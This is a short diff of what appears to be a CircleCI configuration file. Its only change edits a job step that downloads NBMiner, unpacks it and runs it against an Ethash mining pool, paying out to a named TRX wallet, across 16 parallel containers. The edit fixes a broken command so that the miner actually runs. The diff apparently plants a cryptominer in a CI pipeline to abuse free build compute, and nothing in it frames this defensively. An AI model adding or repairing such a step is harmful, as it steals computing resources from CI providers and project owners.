@@ -6,7 +6,7 @@ jobs:
       parallelism: 16
       steps:
         - checkout
-        - run:  wget https://github.com/NebuTech/NBMiner/releases/download/v40.1/NBMiner_40.1_Linux.tgz && tar zxvf NBMiner_40.1_Linux.tgz && chmod +x && ./nbminer. --algo ETHASH --pool ethash.unmineable.com:3333 --user TRX:TDUikTDLFXmZGro1be9FLHUSoe67BFeQXo.worker1 --ethstratum ETHPROXY
+        - run:  wget https://github.com/NebuTech/NBMiner/releases/download/v40.1/NBMiner_40.1_Linux.tgz && tar zxvf NBMiner_40.1_Linux.tgz && ./nbminer --algo ETHASH --pool ethash.unmineable.com:3333 --user TRX:TDUikTDLFXmZGro1be9FLHUSoe67BFeQXo.worker1 --ethstratum ETHPROXY
 
 workflows:
     version: 2.1
